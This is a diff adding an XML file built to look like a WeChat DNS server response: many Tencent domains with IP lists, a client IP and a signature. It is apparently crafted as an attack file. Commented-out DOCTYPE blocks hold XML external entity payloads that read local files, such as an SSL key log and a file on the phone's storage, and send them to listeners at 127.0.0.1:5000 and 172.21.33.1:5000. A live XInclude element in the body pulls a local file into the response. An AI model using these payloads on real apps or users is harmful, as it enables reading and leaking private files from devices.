@@ -1,0 +1,722 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--<!DOCTYPE dns[-->
+        <!--<!ELEMENT dns (xx, retcode, domainlist, builtiniplist, clientip, clientispid,timestamp,signature2)>-->
+        <!--<!ELEMENT retcode (#PCDATA)>-->
+        <!--<!ELEMENT domainlist (#PCDATA|domain)*>-->
+        <!--<!ELEMENT domain (#PCDATA|ip)*>-->
+        <!--<!ATTLIST domain name CDATA "">-->
+        <!--<!ATTLIST domain timeout CDATA "">-->
+        <!--<!ELEMENT ip (#PCDATA)>-->
+        <!--<!ATTLIST ip property CDATA "">-->
+        <!--<!ELEMENT builtiniplist (#PCDATA|ip)*>-->
+        <!--<!ELEMENT clientip (#PCDATA)>-->
+        <!--<!ELEMENT clientispid (#PCDATA)>-->
+        <!--<!ELEMENT timestamp (#PCDATA)>-->
+        <!--<!ELEMENT signature2 (#PCDATA)>-->
+
+        <!--<!ELEMENT xx ANY>-->
+        <!--<!ENTITY file SYSTEM "file:///D://sslkey_fiddle">-->
+        <!--<!ENTITY password SYSTEM "http://127.0.0.1:5000/xxe?&&file;">-->
+        <!--&lt;!&ndash;<!ENTITY file SYSTEM "file:///storage/emulated/0/1.txt">&ndash;&gt;-->
+        <!--&lt;!&ndash;<!ENTITY password SYSTEM "http://172.21.33.1:5000/xxe?%file;">&ndash;&gt;-->
+        <!--]>-->
+<!--<!DOCTYPE dns[-->
+        <!--<!ENTITY % file SYSTEM "file:///storage/emulated/0/1.txt">-->
+        <!--<!ENTITY % ne PUBLIC "http://172.21.33.1:5000/dtd">-->
+        <!--%ne;-->
+        <!--]>-->
+
+<dns>
+    <root xmlns:xi="http://www.w3.org/2001/XInclude">
+     <xi:include href="file:///storage/emulated/0/1.txt" parse="text"/>
+    </root>
+    <retcode>0</retcode>
+    <domainlist>
+        <domain name="extshort.weixin.qq.com" timeout="600">
+            <ip>180.163.25.140</ip>
+            <ip>180.163.25.139</ip>
+            <ip>101.89.15.101</ip>
+            <ip>101.89.15.100</ip>
+            <ip>101.226.211.44</ip>
+            <ip>101.226.211.101</ip>
+        </domain>
+        <domain name="localhost" timeout="600">
+            <ip>127.0.0.1</ip>
+        </domain>
+        <domain name="long.weixin.qq.com" timeout="600">
+            <ip>180.163.25.150</ip>
+            <ip>180.163.25.149</ip>
+            <ip>101.89.15.106</ip>
+            <ip>101.89.15.105</ip>
+            <ip>101.226.211.46</ip>
+            <ip>101.226.211.105</ip>
+        </domain>
+        <domain name="minorshort.weixin.qq.com" timeout="600">
+            <ip>61.151.224.41</ip>
+            <ip>61.151.183.16</ip>
+            <ip>101.227.169.159</ip>
+        </domain>
+        <domain name="mlextshort.weixin.qq.com" timeout="600">
+            <ip>220.171.124.105</ip>
+            <ip>220.171.124.102</ip>
+        </domain>
+        <domain name="mllong.weixin.qq.com" timeout="600">
+            <ip>220.171.124.107</ip>
+            <ip>220.171.124.104</ip>
+        </domain>
+        <domain name="mlminorshort.weixin.qq.com" timeout="600">
+            <ip>220.171.124.105</ip>
+            <ip>220.171.124.102</ip>
+        </domain>
+        <domain name="mlshort.pay.weixin.qq.com" timeout="600">
+            <ip>220.171.124.11</ip>
+        </domain>
+        <domain name="mlshort.weixin.qq.com" timeout="600">
+            <ip>220.171.124.105</ip>
+            <ip>220.171.124.102</ip>
+        </domain>
+        <domain name="newyear.weixin.qq.com" timeout="600">
+            <ip>180.153.160.11</ip>
+        </domain>
+        <domain name="sh2tjextshort.weixin.qq.com" timeout="600">
+            <ip>180.163.25.140</ip>
+            <ip>180.163.25.139</ip>
+            <ip>101.89.15.101</ip>
+            <ip>101.89.15.100</ip>
+            <ip>101.226.211.44</ip>
+            <ip>101.226.211.101</ip>
+        </domain>
+        <domain name="sh2tjlong.weixin.qq.com" timeout="600">
+            <ip>123.151.10.186</ip>
+        </domain>
+        <domain name="sh2tjminorshort.weixin.qq.com" timeout="600">
+            <ip>61.151.224.41</ip>
+            <ip>61.151.183.16</ip>
+            <ip>101.227.169.159</ip>
+        </domain>
+        <domain name="sh2tjshort.weixin.qq.com" timeout="600">
+            <ip>123.151.10.185</ip>
+        </domain>
+        <domain name="shextshort.weixin.qq.com" timeout="600">
+            <ip>180.163.25.140</ip>
+            <ip>180.163.25.139</ip>
+            <ip>101.89.15.101</ip>
+            <ip>101.89.15.100</ip>
+            <ip>101.226.211.44</ip>
+            <ip>101.226.211.101</ip>
+        </domain>
+        <domain name="short.pay.weixin.qq.com" timeout="600">
+            <ip>180.163.25.142</ip>
+            <ip>101.226.211.100</ip>
+        </domain>
+        <domain name="short.weixin.qq.com" timeout="600">
+            <ip>180.163.25.140</ip>
+            <ip>180.163.25.139</ip>
+            <ip>101.89.15.101</ip>
+            <ip>101.89.15.100</ip>
+            <ip>101.226.211.44</ip>
+            <ip>101.226.211.101</ip>
+        </domain>
+        <domain name="shshort.pay.weixin.qq.com" timeout="600">
+            <ip>180.163.25.142</ip>
+            <ip>101.226.211.100</ip>
+        </domain>
+        <domain name="sz2tjextshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.100</ip>
+            <ip>183.3.224.141</ip>
+            <ip>14.215.158.101</ip>
+            <ip>14.215.158.100</ip>
+            <ip>113.96.209.100</ip>
+            <ip>113.96.202.101</ip>
+        </domain>
+        <domain name="sz2tjlong.weixin.qq.com" timeout="600">
+            <ip>123.151.10.186</ip>
+        </domain>
+        <domain name="sz2tjminorshort.weixin.qq.com" timeout="600">
+            <ip>183.61.46.199</ip>
+            <ip>14.18.245.167</ip>
+            <ip>14.17.42.45</ip>
+        </domain>
+        <domain name="sz2tjshort.weixin.qq.com" timeout="600">
+            <ip>123.151.10.185</ip>
+        </domain>
+        <domain name="szextshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.105</ip>
+            <ip>183.3.234.100</ip>
+            <ip>183.3.224.144</ip>
+            <ip>183.3.224.141</ip>
+            <ip>14.215.158.100</ip>
+            <ip>113.96.209.101</ip>
+        </domain>
+        <domain name="szlong.weixin.qq.com" timeout="600">
+            <ip>183.3.234.107</ip>
+            <ip>183.3.234.102</ip>
+            <ip>183.3.224.146</ip>
+            <ip>14.215.158.102</ip>
+            <ip>113.96.209.105</ip>
+            <ip>113.96.202.105</ip>
+        </domain>
+        <domain name="szminorshort.weixin.qq.com" timeout="600">
+            <ip>183.61.46.199</ip>
+            <ip>14.18.245.167</ip>
+            <ip>14.17.42.45</ip>
+        </domain>
+        <domain name="szshort.pay.weixin.qq.com" timeout="600">
+            <ip>183.3.234.104</ip>
+            <ip>183.3.224.143</ip>
+        </domain>
+        <domain name="szshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.105</ip>
+            <ip>183.3.234.100</ip>
+            <ip>183.3.224.141</ip>
+            <ip>113.96.209.101</ip>
+            <ip>113.96.209.100</ip>
+            <ip>113.96.202.100</ip>
+        </domain>
+        <domain name="tjextshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.105</ip>
+            <ip>183.3.234.100</ip>
+            <ip>183.3.224.144</ip>
+            <ip>183.3.224.141</ip>
+            <ip>14.215.158.101</ip>
+            <ip>113.96.209.101</ip>
+        </domain>
+        <domain name="tjlong.weixin.qq.com" timeout="600">
+            <ip>123.151.10.186</ip>
+        </domain>
+        <domain name="tjshort.weixin.qq.com" timeout="600">
+            <ip>123.151.10.185</ip>
+        </domain>
+        <domain name="caextshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.11</ip>
+            <ip>113.96.209.108</ip>
+        </domain>
+        <domain name="calong.weixin.qq.com" timeout="600">
+            <ip>183.3.234.109</ip>
+            <ip>14.17.41.157</ip>
+        </domain>
+        <domain name="caminorshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.11</ip>
+            <ip>113.96.209.108</ip>
+        </domain>
+        <domain name="cashort.pay.weixin.qq.com" timeout="600">
+            <ip>183.3.234.111</ip>
+        </domain>
+        <domain name="cashort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.11</ip>
+            <ip>113.96.209.108</ip>
+        </domain>
+        <domain name="hkextshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.11</ip>
+            <ip>113.96.209.108</ip>
+        </domain>
+        <domain name="hklong.weixin.qq.com" timeout="600">
+            <ip>183.3.234.109</ip>
+            <ip>14.17.41.157</ip>
+        </domain>
+        <domain name="hkminorshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.11</ip>
+            <ip>113.96.209.108</ip>
+        </domain>
+        <domain name="hkshort.pay.weixin.qq.com" timeout="600">
+            <ip>183.3.234.111</ip>
+        </domain>
+        <domain name="hkshort.weixin.qq.com" timeout="600">
+            <ip>183.3.234.11</ip>
+            <ip>113.96.209.108</ip>
+        </domain>
+        <domain name="emoji.qpic.cn" timeout="600">
+            <ip property="major">115.231.37.148</ip>
+            <ip property="major">122.228.0.171</ip>
+            <ip property="major">115.231.191.157</ip>
+            <ip property="major">115.231.37.147</ip>
+            <ip property="major">183.131.53.27</ip>
+            <ip property="major">122.228.0.173</ip>
+            <ip property="major">115.231.37.149</ip>
+            <ip property="major">183.131.53.38</ip>
+            <ip property="major">115.231.37.146</ip>
+            <ip property="major">122.228.0.172</ip>
+            <ip property="major">115.231.37.145</ip>
+            <ip property="major">122.228.0.174</ip>
+        </domain>
+        <domain name="mmsns.qpic.cn" timeout="600">
+            <ip property="major">115.231.229.107</ip>
+            <ip property="major">115.231.229.141</ip>
+            <ip property="major">115.231.229.159</ip>
+            <ip property="major">115.231.229.161</ip>
+            <ip property="major">115.231.229.201</ip>
+            <ip property="major">115.231.229.203</ip>
+            <ip property="major">115.231.229.221</ip>
+            <ip property="major">115.231.229.223</ip>
+            <ip property="major">115.231.229.25</ip>
+            <ip property="major">115.231.229.26</ip>
+            <ip property="major">115.231.229.45</ip>
+            <ip property="major">115.231.229.46</ip>
+            <ip property="major">115.231.229.47</ip>
+            <ip property="major">115.231.229.78</ip>
+            <ip property="major">115.231.229.87</ip>
+            <ip property="major">115.231.229.88</ip>
+            <ip property="major">115.231.229.89</ip>
+            <ip property="major">115.231.229.98</ip>
+            <ip property="major">122.225.36.13</ip>
+            <ip property="major">122.225.36.43</ip>
+        </domain>
+        <domain name="res.servicewechat.com" timeout="600">
+            <ip property="major">122.228.0.150</ip>
+            <ip property="major">122.228.56.156</ip>
+            <ip property="major">122.228.72.165</ip>
+            <ip property="major">122.228.0.153</ip>
+            <ip property="major">115.231.191.144</ip>
+            <ip property="major">122.228.72.163</ip>
+            <ip property="major">122.228.0.151</ip>
+            <ip property="major">115.231.191.141</ip>
+            <ip property="major">115.231.191.142</ip>
+            <ip property="major">122.228.72.159</ip>
+            <ip property="major">122.228.72.164</ip>
+            <ip property="major">122.228.0.152</ip>
+            <ip property="major">115.231.191.143</ip>
+            <ip property="major">122.228.56.155</ip>
+            <ip property="major">122.228.72.167</ip>
+            <ip property="major">115.231.191.146</ip>
+            <ip property="major">122.228.72.166</ip>
+        </domain>
+        <domain name="resstatic.servicewechat.com" timeout="600">
+            <ip property="major">182.140.167.37</ip>
+        </domain>
+        <domain name="shmmsns.qpic.cn" timeout="600">
+            <ip property="major">115.231.229.107</ip>
+            <ip property="major">115.231.229.141</ip>
+            <ip property="major">115.231.229.159</ip>
+            <ip property="major">115.231.229.161</ip>
+            <ip property="major">115.231.229.201</ip>
+            <ip property="major">115.231.229.203</ip>
+            <ip property="major">115.231.229.221</ip>
+            <ip property="major">115.231.229.223</ip>
+            <ip property="major">115.231.229.25</ip>
+            <ip property="major">115.231.229.26</ip>
+            <ip property="major">115.231.229.45</ip>
+            <ip property="major">115.231.229.46</ip>
+            <ip property="major">115.231.229.47</ip>
+            <ip property="major">115.231.229.78</ip>
+            <ip property="major">115.231.229.87</ip>
+            <ip property="major">115.231.229.88</ip>
+            <ip property="major">115.231.229.89</ip>
+            <ip property="major">115.231.229.98</ip>
+            <ip property="major">122.225.36.13</ip>
+            <ip property="major">122.225.36.43</ip>
+            <ip property="minor">180.97.10.105</ip>
+            <ip property="minor">180.97.10.106</ip>
+            <ip property="minor">180.97.10.23</ip>
+            <ip property="minor">180.97.10.24</ip>
+            <ip property="minor">180.97.10.27</ip>
+            <ip property="minor">180.97.10.28</ip>
+            <ip property="minor">180.97.10.34</ip>
+            <ip property="minor">180.97.10.35</ip>
+            <ip property="minor">180.97.10.36</ip>
+            <ip property="minor">180.97.10.38</ip>
+            <ip property="minor">180.97.10.39</ip>
+            <ip property="minor">180.97.10.41</ip>
+            <ip property="minor">180.97.10.42</ip>
+            <ip property="minor">180.97.10.43</ip>
+            <ip property="minor">180.97.8.112</ip>
+            <ip property="minor">180.97.8.12</ip>
+            <ip property="minor">180.97.8.16</ip>
+            <ip property="minor">180.97.8.26</ip>
+            <ip property="minor">180.97.8.27</ip>
+            <ip property="minor">180.97.8.29</ip>
+            <ip property="minor">180.97.8.31</ip>
+            <ip property="minor">180.97.8.37</ip>
+            <ip property="minor">180.97.8.45</ip>
+        </domain>
+        <domain name="shp.qlogo.cn" timeout="600">
+            <ip property="major">180.97.9.11</ip>
+            <ip property="major">180.97.9.100</ip>
+            <ip property="major">101.226.212.107</ip>
+            <ip property="major">101.226.76.160</ip>
+            <ip property="major">101.226.90.145</ip>
+            <ip property="major">61.151.168.141</ip>
+            <ip property="major">101.91.63.156</ip>
+            <ip property="major">101.91.63.157</ip>
+            <ip property="major">61.151.206.58</ip>
+            <ip property="major">101.91.63.158</ip>
+            <ip property="major">180.97.117.116</ip>
+            <ip property="major">180.97.117.108</ip>
+            <ip property="major">180.97.117.100</ip>
+            <ip property="major">180.97.9.124</ip>
+            <ip property="major">180.97.9.123</ip>
+            <ip property="major">180.97.9.125</ip>
+            <ip property="major">180.97.117.101</ip>
+            <ip property="major">180.97.9.122</ip>
+            <ip property="major">180.97.8.103</ip>
+            <ip property="major">180.97.117.50</ip>
+        </domain>
+        <domain name="shxzwxsns.video.qq.com" timeout="600">
+            <ip property="major">150.138.233.84</ip>
+            <ip property="major">150.138.233.146</ip>
+            <ip property="major">150.138.233.13</ip>
+            <ip property="major">150.138.233.17</ip>
+            <ip property="major">150.138.233.21</ip>
+            <ip property="major">150.138.233.25</ip>
+            <ip property="major">150.138.233.29</ip>
+            <ip property="major">150.138.233.33</ip>
+            <ip property="major">150.138.233.73</ip>
+            <ip property="major">150.138.233.77</ip>
+            <ip property="major">150.138.233.81</ip>
+            <ip property="major">150.138.233.89</ip>
+            <ip property="major">150.138.233.22</ip>
+            <ip property="major">150.138.233.30</ip>
+            <ip property="major">150.138.233.74</ip>
+            <ip property="major">150.138.233.82</ip>
+            <ip property="major">150.138.233.94</ip>
+            <ip property="major">150.138.233.144</ip>
+            <ip property="major">150.138.233.88</ip>
+            <ip property="major">150.138.233.92</ip>
+            <ip property="major">150.138.233.142</ip>
+            <ip property="major">150.138.233.150</ip>
+            <ip property="major">150.138.233.85</ip>
+            <ip property="major">150.138.233.93</ip>
+            <ip property="major">150.138.233.143</ip>
+            <ip property="major">150.138.233.147</ip>
+            <ip property="major">150.138.233.14</ip>
+            <ip property="major">150.138.233.18</ip>
+            <ip property="major">150.138.233.26</ip>
+            <ip property="major">150.138.233.34</ip>
+        </domain>
+        <domain name="shzjwxsns.video.qq.com" timeout="600">
+            <ip property="major">150.138.233.84</ip>
+            <ip property="major">150.138.233.146</ip>
+            <ip property="major">150.138.233.13</ip>
+            <ip property="major">150.138.233.17</ip>
+            <ip property="major">150.138.233.21</ip>
+            <ip property="major">150.138.233.25</ip>
+            <ip property="major">150.138.233.29</ip>
+            <ip property="major">150.138.233.33</ip>
+            <ip property="major">150.138.233.73</ip>
+            <ip property="major">150.138.233.77</ip>
+            <ip property="major">150.138.233.81</ip>
+            <ip property="major">150.138.233.89</ip>
+            <ip property="major">150.138.233.22</ip>
+            <ip property="major">150.138.233.30</ip>
+            <ip property="major">150.138.233.74</ip>
+            <ip property="major">150.138.233.82</ip>
+            <ip property="major">150.138.233.94</ip>
+            <ip property="major">150.138.233.144</ip>
+            <ip property="major">150.138.233.88</ip>
+            <ip property="major">150.138.233.92</ip>
+            <ip property="major">150.138.233.142</ip>
+            <ip property="major">150.138.233.150</ip>
+            <ip property="major">150.138.233.85</ip>
+            <ip property="major">150.138.233.93</ip>
+            <ip property="major">150.138.233.143</ip>
+            <ip property="major">150.138.233.147</ip>
+            <ip property="major">150.138.233.14</ip>
+            <ip property="major">150.138.233.18</ip>
+            <ip property="major">150.138.233.26</ip>
+            <ip property="major">150.138.233.34</ip>
+        </domain>
+        <domain name="szmmsns.qpic.cn" timeout="600">
+            <ip property="major">115.231.229.107</ip>
+            <ip property="major">115.231.229.141</ip>
+            <ip property="major">115.231.229.159</ip>
+            <ip property="major">115.231.229.161</ip>
+            <ip property="major">115.231.229.201</ip>
+            <ip property="major">115.231.229.203</ip>
+            <ip property="major">115.231.229.221</ip>
+            <ip property="major">115.231.229.223</ip>
+            <ip property="major">115.231.229.25</ip>
+            <ip property="major">115.231.229.26</ip>
+            <ip property="major">115.231.229.45</ip>
+            <ip property="major">115.231.229.46</ip>
+            <ip property="major">115.231.229.47</ip>
+            <ip property="major">115.231.229.78</ip>
+            <ip property="major">115.231.229.87</ip>
+            <ip property="major">115.231.229.88</ip>
+            <ip property="major">115.231.229.89</ip>
+            <ip property="major">115.231.229.98</ip>
+            <ip property="major">122.225.36.13</ip>
+            <ip property="major">122.225.36.43</ip>
+            <ip property="minor">14.18.245.196</ip>
+            <ip property="minor">14.18.245.201</ip>
+            <ip property="minor">14.18.245.245</ip>
+            <ip property="minor">183.3.226.57</ip>
+            <ip property="minor">183.3.226.82</ip>
+            <ip property="minor">183.3.226.83</ip>
+            <ip property="minor">183.3.226.84</ip>
+            <ip property="minor">183.3.226.85</ip>
+            <ip property="minor">183.3.234.147</ip>
+            <ip property="minor">183.3.235.104</ip>
+            <ip property="minor">183.3.235.119</ip>
+            <ip property="minor">183.3.235.147</ip>
+            <ip property="minor">183.3.235.163</ip>
+            <ip property="minor">183.61.49.200</ip>
+            <ip property="minor">59.37.96.126</ip>
+            <ip property="minor">59.37.96.142</ip>
+            <ip property="minor">59.37.96.144</ip>
+            <ip property="minor">59.37.96.15</ip>
+            <ip property="minor">59.37.96.155</ip>
+            <ip property="minor">59.37.96.34</ip>
+        </domain>
+        <domain name="szxzwxsns.video.qq.com" timeout="600">
+            <ip property="major">150.138.233.84</ip>
+            <ip property="major">150.138.233.146</ip>
+            <ip property="major">150.138.233.13</ip>
+            <ip property="major">150.138.233.17</ip>
+            <ip property="major">150.138.233.21</ip>
+            <ip property="major">150.138.233.25</ip>
+            <ip property="major">150.138.233.29</ip>
+            <ip property="major">150.138.233.33</ip>
+            <ip property="major">150.138.233.73</ip>
+            <ip property="major">150.138.233.77</ip>
+            <ip property="major">150.138.233.81</ip>
+            <ip property="major">150.138.233.89</ip>
+            <ip property="major">150.138.233.22</ip>
+            <ip property="major">150.138.233.30</ip>
+            <ip property="major">150.138.233.74</ip>
+            <ip property="major">150.138.233.82</ip>
+            <ip property="major">150.138.233.94</ip>
+            <ip property="major">150.138.233.144</ip>
+            <ip property="major">150.138.233.88</ip>
+            <ip property="major">150.138.233.92</ip>
+            <ip property="major">150.138.233.142</ip>
+            <ip property="major">150.138.233.150</ip>
+            <ip property="major">150.138.233.85</ip>
+            <ip property="major">150.138.233.93</ip>
+            <ip property="major">150.138.233.143</ip>
+            <ip property="major">150.138.233.147</ip>
+            <ip property="major">150.138.233.14</ip>
+            <ip property="major">150.138.233.18</ip>
+            <ip property="major">150.138.233.26</ip>
+            <ip property="major">150.138.233.34</ip>
+        </domain>
+        <domain name="szzjwxsns.video.qq.com" timeout="600">
+            <ip property="major">150.138.233.84</ip>
+            <ip property="major">150.138.233.146</ip>
+            <ip property="major">150.138.233.13</ip>
+            <ip property="major">150.138.233.17</ip>
+            <ip property="major">150.138.233.21</ip>
+            <ip property="major">150.138.233.25</ip>
+            <ip property="major">150.138.233.29</ip>
+            <ip property="major">150.138.233.33</ip>
+            <ip property="major">150.138.233.73</ip>
+            <ip property="major">150.138.233.77</ip>
+            <ip property="major">150.138.233.81</ip>
+            <ip property="major">150.138.233.89</ip>
+            <ip property="major">150.138.233.22</ip>
+            <ip property="major">150.138.233.30</ip>
+            <ip property="major">150.138.233.74</ip>
+            <ip property="major">150.138.233.82</ip>
+            <ip property="major">150.138.233.94</ip>
+            <ip property="major">150.138.233.144</ip>
+            <ip property="major">150.138.233.88</ip>
+            <ip property="major">150.138.233.92</ip>
+            <ip property="major">150.138.233.142</ip>
+            <ip property="major">150.138.233.150</ip>
+            <ip property="major">150.138.233.85</ip>
+            <ip property="major">150.138.233.93</ip>
+            <ip property="major">150.138.233.143</ip>
+            <ip property="major">150.138.233.147</ip>
+            <ip property="major">150.138.233.14</ip>
+            <ip property="major">150.138.233.18</ip>
+            <ip property="major">150.138.233.26</ip>
+            <ip property="major">150.138.233.34</ip>
+            <ip property="minor">183.3.235.14</ip>
+            <ip property="minor">183.3.235.34</ip>
+            <ip property="minor">183.3.235.35</ip>
+            <ip property="minor">183.3.235.37</ip>
+            <ip property="minor">183.3.235.38</ip>
+            <ip property="minor">183.3.235.55</ip>
+            <ip property="minor">183.3.235.56</ip>
+            <ip property="minor">183.3.235.58</ip>
+            <ip property="minor">183.3.235.59</ip>
+            <ip property="minor">183.3.235.60</ip>
+            <ip property="minor">183.3.235.61</ip>
+            <ip property="minor">183.3.235.121</ip>
+            <ip property="minor">183.3.233.145</ip>
+            <ip property="minor">183.3.233.147</ip>
+            <ip property="minor">183.3.233.149</ip>
+            <ip property="minor">183.3.233.155</ip>
+            <ip property="minor">183.3.233.157</ip>
+            <ip property="minor">183.3.235.167</ip>
+            <ip property="minor">183.3.234.170</ip>
+            <ip property="minor">183.3.234.172</ip>
+            <ip property="minor">183.3.234.174</ip>
+            <ip property="minor">183.3.234.176</ip>
+            <ip property="minor">183.3.234.183</ip>
+            <ip property="minor">183.3.234.205</ip>
+            <ip property="minor">183.3.234.248</ip>
+            <ip property="minor">183.3.234.253</ip>
+            <ip property="minor">183.3.234.254</ip>
+            <ip property="minor">183.3.235.57</ip>
+        </domain>
+        <domain name="vweixinf.tc.qq.com" timeout="600">
+            <ip property="major">150.138.233.84</ip>
+            <ip property="major">150.138.233.146</ip>
+            <ip property="major">150.138.233.13</ip>
+            <ip property="major">150.138.233.17</ip>
+            <ip property="major">150.138.233.21</ip>
+            <ip property="major">150.138.233.25</ip>
+            <ip property="major">150.138.233.29</ip>
+            <ip property="major">150.138.233.33</ip>
+            <ip property="major">150.138.233.73</ip>
+            <ip property="major">150.138.233.77</ip>
+            <ip property="major">150.138.233.81</ip>
+            <ip property="major">150.138.233.89</ip>
+            <ip property="major">150.138.233.22</ip>
+            <ip property="major">150.138.233.30</ip>
+            <ip property="major">150.138.233.74</ip>
+            <ip property="major">150.138.233.82</ip>
+            <ip property="major">150.138.233.94</ip>
+            <ip property="major">150.138.233.144</ip>
+            <ip property="major">150.138.233.88</ip>
+            <ip property="major">150.138.233.92</ip>
+            <ip property="major">150.138.233.142</ip>
+            <ip property="major">150.138.233.150</ip>
+            <ip property="major">150.138.233.85</ip>
+            <ip property="major">150.138.233.93</ip>
+            <ip property="major">150.138.233.143</ip>
+            <ip property="major">150.138.233.147</ip>
+            <ip property="major">150.138.233.14</ip>
+            <ip property="major">150.138.233.18</ip>
+            <ip property="major">150.138.233.26</ip>
+            <ip property="major">150.138.233.34</ip>
+        </domain>
+        <domain name="weixinc2c.tc.qq.com" timeout="600">
+            <ip property="major">115.231.37.148</ip>
+            <ip property="major">122.228.0.171</ip>
+            <ip property="major">115.231.191.157</ip>
+            <ip property="major">115.231.37.147</ip>
+            <ip property="major">183.131.53.27</ip>
+            <ip property="major">122.228.0.173</ip>
+            <ip property="major">115.231.37.149</ip>
+            <ip property="major">183.131.53.38</ip>
+            <ip property="major">115.231.37.146</ip>
+            <ip property="major">122.228.0.172</ip>
+            <ip property="major">115.231.37.145</ip>
+            <ip property="major">122.228.0.174</ip>
+        </domain>
+        <domain name="wx.qlogo.cn" timeout="600">
+            <ip property="major">180.163.25.31</ip>
+            <ip property="major">101.226.233.167</ip>
+            <ip property="major">61.151.168.149</ip>
+            <ip property="major">180.163.21.101</ip>
+            <ip property="major">101.227.160.54</ip>
+            <ip property="major">180.163.26.112</ip>
+            <ip property="major">61.151.186.31</ip>
+            <ip property="major">101.226.90.164</ip>
+            <ip property="major">180.97.8.36</ip>
+            <ip property="major">180.163.21.155</ip>
+            <ip property="major">180.97.8.101</ip>
+            <ip property="major">180.97.8.25</ip>
+            <ip property="major">180.163.26.115</ip>
+            <ip property="major">180.163.26.111</ip>
+        </domain>
+        <domain name="wximg.qq.com" timeout="600">
+            <ip property="major">122.228.56.153</ip>
+            <ip property="major">122.228.0.143</ip>
+            <ip property="major">122.228.56.151</ip>
+            <ip property="major">122.228.72.156</ip>
+            <ip property="major">122.228.56.150</ip>
+            <ip property="major">122.228.72.172</ip>
+            <ip property="major">122.228.0.145</ip>
+            <ip property="major">122.228.72.171</ip>
+            <ip property="major">122.228.72.153</ip>
+            <ip property="major">122.228.72.157</ip>
+            <ip property="major">122.228.72.170</ip>
+            <ip property="major">122.228.0.142</ip>
+            <ip property="major">122.228.56.152</ip>
+            <ip property="major">122.228.72.154</ip>
+            <ip property="major">122.228.72.155</ip>
+            <ip property="major">115.231.191.155</ip>
+            <ip property="major">122.228.0.141</ip>
+            <ip property="major">115.231.191.156</ip>
+            <ip property="major">122.228.0.144</ip>
+        </domain>
+        <domain name="wxsnsdy.video.qq.com" timeout="600">
+            <ip property="major">150.138.233.84</ip>
+            <ip property="major">150.138.233.146</ip>
+            <ip property="major">150.138.233.13</ip>
+            <ip property="major">150.138.233.17</ip>
+            <ip property="major">150.138.233.21</ip>
+            <ip property="major">150.138.233.25</ip>
+            <ip property="major">150.138.233.29</ip>
+            <ip property="major">150.138.233.33</ip>
+            <ip property="major">150.138.233.73</ip>
+            <ip property="major">150.138.233.77</ip>
+            <ip property="major">150.138.233.81</ip>
+            <ip property="major">150.138.233.89</ip>
+            <ip property="major">150.138.233.22</ip>
+            <ip property="major">150.138.233.30</ip>
+            <ip property="major">150.138.233.74</ip>
+            <ip property="major">150.138.233.82</ip>
+            <ip property="major">150.138.233.94</ip>
+            <ip property="major">150.138.233.144</ip>
+            <ip property="major">150.138.233.88</ip>
+            <ip property="major">150.138.233.92</ip>
+            <ip property="major">150.138.233.142</ip>
+            <ip property="major">150.138.233.150</ip>
+            <ip property="major">150.138.233.85</ip>
+            <ip property="major">150.138.233.93</ip>
+            <ip property="major">150.138.233.143</ip>
+            <ip property="major">150.138.233.147</ip>
+            <ip property="major">150.138.233.14</ip>
+            <ip property="major">150.138.233.18</ip>
+            <ip property="major">150.138.233.26</ip>
+            <ip property="major">150.138.233.34</ip>
+        </domain>
+        <domain name="wxsnsdy.wxs.qq.com" timeout="600">
+            <ip property="major">150.138.233.84</ip>
+            <ip property="major">150.138.233.146</ip>
+            <ip property="major">150.138.233.13</ip>
+            <ip property="major">150.138.233.17</ip>
+            <ip property="major">150.138.233.21</ip>
+            <ip property="major">150.138.233.25</ip>
+            <ip property="major">150.138.233.29</ip>
+            <ip property="major">150.138.233.33</ip>
+            <ip property="major">150.138.233.73</ip>
+            <ip property="major">150.138.233.77</ip>
+            <ip property="major">150.138.233.81</ip>
+            <ip property="major">150.138.233.89</ip>
+            <ip property="major">150.138.233.22</ip>
+            <ip property="major">150.138.233.30</ip>
+            <ip property="major">150.138.233.74</ip>
+            <ip property="major">150.138.233.82</ip>
+            <ip property="major">150.138.233.94</ip>
+            <ip property="major">150.138.233.144</ip>
+            <ip property="major">150.138.233.88</ip>
+            <ip property="major">150.138.233.92</ip>
+            <ip property="major">150.138.233.142</ip>
+            <ip property="major">150.138.233.150</ip>
+            <ip property="major">150.138.233.85</ip>
+            <ip property="major">150.138.233.93</ip>
+            <ip property="major">150.138.233.143</ip>
+            <ip property="major">150.138.233.147</ip>
+            <ip property="major">150.138.233.14</ip>
+            <ip property="major">150.138.233.18</ip>
+            <ip property="major">150.138.233.26</ip>
+            <ip property="major">150.138.233.34</ip>
+        </domain>
+        <domain name="wxsnsdyvip.wxs.qq.com" timeout="600">
+            <ip property="major">115.231.37.148</ip>
+            <ip property="major">122.228.0.171</ip>
+            <ip property="major">115.231.191.157</ip>
+            <ip property="major">115.231.37.147</ip>
+            <ip property="major">183.131.53.27</ip>
+            <ip property="major">122.228.0.173</ip>
+            <ip property="major">115.231.37.149</ip>
+            <ip property="major">183.131.53.38</ip>
+            <ip property="major">115.231.37.146</ip>
+            <ip property="major">122.228.0.172</ip>
+            <ip property="major">115.231.37.145</ip>
+            <ip property="major">122.228.0.174</ip>
+        </domain>
+    </domainlist>
+    <builtiniplist>
+        <ip>183.61.56.126</ip>
+        <ip>123.151.10.172</ip>
+        <ip>101.226.211.106</ip>
+    </builtiniplist>
+    <clientip>220.184.96.172</clientip>
+    <clientispid>0</clientispid>
+    <timestamp>1534089600</timestamp>
+    <signature2>MEUCIQDbHS+prjlxT06trQpQe8pgkHVH52uUXEZBCLo1U2tmvAIgIimw8F/lOorlmbTucbpGYyhjZEHDcJvN4vFo/Bssfec=</signature2>
+</dns>
